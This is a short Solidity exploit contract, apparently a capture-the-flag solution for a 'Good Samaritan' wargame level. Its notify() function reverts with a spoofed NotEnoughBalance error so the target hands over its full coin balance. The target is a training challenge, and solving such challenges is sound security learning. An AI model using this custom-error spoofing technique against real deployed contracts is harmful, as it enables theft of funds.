//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;


// GoodSamaritan - 0x7B8378BbfCfCCa510569478DdE408f18e70b922F
// wallet        - 0x58cfD388fc49d1C9332014C265BC58041565d167
// coin          - 0xF5c08096618433Cb1D1516c32d45913A7FB09969


interface IGoodSamaritan {
    function requestDonation() external returns(bool);
}

interface ICoin {
    function balances(address) external view returns(uint256);
}

contract GoodSamaritanPwn {

ICoin coin;

constructor(address _coinAddr) {
coin = ICoin(_coinAddr);
} 

error NotEnoughBalance();


function pwn(address _goodSamaritanAddr) external {
 IGoodSamaritan goodSama = IGoodSamaritan(_goodSamaritanAddr);
 goodSama.requestDonation();

 require(coin.balances(address(this)) == 10**6, "BadSamaritan Failed");
}


function notify(uint256 _amount) external pure {

    if(_amount <=10)     {

    revert NotEnoughBalance();

    }   
  }
}
